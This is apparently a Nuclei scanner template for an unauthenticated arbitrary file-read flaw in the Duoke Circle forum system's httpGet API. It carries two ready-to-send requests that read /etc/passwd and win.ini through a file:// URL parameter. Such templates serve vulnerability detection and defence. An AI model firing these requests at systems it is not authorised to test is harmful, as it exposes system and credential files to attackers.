http:
    - matchers:
        - part: body
          type: word
          words:
            - 'root:'
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - "GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1\nHost: {{Hostname}} \n"
        - "GET /index.php/api/login/httpGet?url=file://C:/windows/win.ini HTTP/1.1\nHost: {{Hostname}} \n"
id: duoke-httpGet-File-reading
info:
    author: Superhero
    description: |-
        body="/static/index/js/jweixin-1.2.0.js"
        多客圈子论坛系统 /index.php/api/login/httpGet 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件等)，导致网站处于极度不安全状态。
    name: 多客圈子论坛系统 httpGet 任意文件读取漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/139546058
    severity: high
    tags:
        - File reading
